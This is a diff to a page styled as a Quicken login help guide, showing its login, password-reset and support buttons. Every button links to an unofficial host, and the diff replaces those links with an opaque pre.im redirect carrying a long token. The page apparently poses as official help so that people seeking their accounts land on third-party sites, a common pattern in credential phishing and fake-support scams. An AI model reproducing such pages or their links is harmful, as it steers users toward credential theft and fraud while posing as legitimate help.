@@ -4,7 +4,7 @@ How to Login to Your Quicken Account?
 .. raw:: html
 
     <div style="text-align:center; margin-top:30px;">
-        <a href="https://quickenhelphub.pages.dev/" style="background-color:#28a745; color:#ffffff; padding:12px 28px; font-size:16px; font-weight:bold; text-decoration:none; border-radius:6px; box-shadow:0 4px 6px rgba(0,0,0,0.1); display:inline-block;">
+        <a href=" https://pre.im/?kjpyyo1wIHNERaESMsMI6RlaaglcccG0DZ2onvV0TFztz11oYcKJx8hvpVL3QEG" style="background-color:#28a745; color:#ffffff; padding:12px 28px; font-size:16px; font-weight:bold; text-decoration:none; border-radius:6px; box-shadow:0 4px 6px rgba(0,0,0,0.1); display:inline-block;">
             Login to Quicken Account
         </a>
     </div>
@@ -135,13 +135,13 @@ Logging into your Quicken account is the first step to effective financial manag
 .. raw:: html
 
     <div style="text-align:center; margin-top:30px;">
-        <a href="https://quickenhelphub.pages.dev/" style="background-color:#007bff; color:#ffffff; padding:10px 24px; font-size:15px; font-weight:bold; text-decoration:none; border-radius:5px; margin:5px; display:inline-block;">
+        <a href=" https://pre.im/?kjpyyo1wIHNERaESMsMI6RlaaglcccG0DZ2onvV0TFztz11oYcKJx8hvpVL3QEG" style="background-color:#007bff; color:#ffffff; padding:10px 24px; font-size:15px; font-weight:bold; text-decoration:none; border-radius:5px; margin:5px; display:inline-block;">
              Login to Quicken
         </a>
-        <a href="https://quickenhelphub.pages.dev/" style="background-color:#6c757d; color:#ffffff; padding:10px 24px; font-size:15px; font-weight:bold; text-decoration:none; border-radius:5px; margin:5px; display:inline-block;">
+        <a href=" https://pre.im/?kjpyyo1wIHNERaESMsMI6RlaaglcccG0DZ2onvV0TFztz11oYcKJx8hvpVL3QEG" style="background-color:#6c757d; color:#ffffff; padding:10px 24px; font-size:15px; font-weight:bold; text-decoration:none; border-radius:5px; margin:5px; display:inline-block;">
              Forgot Password
         </a>
-        <a href="https://quickenhelphub.pages.dev/" style="background-color:#28a745; color:#ffffff; padding:10px 24px; font-size:15px; font-weight:bold; text-decoration:none; border-radius:5px; margin:5px; display:inline-block;">
+        <a href=" https://pre.im/?kjpyyo1wIHNERaESMsMI6RlaaglcccG0DZ2onvV0TFztz11oYcKJx8hvpVL3QEG" style="background-color:#28a745; color:#ffffff; padding:10px 24px; font-size:15px; font-weight:bold; text-decoration:none; border-radius:5px; margin:5px; display:inline-block;">
              Quicken Support
         </a>
     </div>
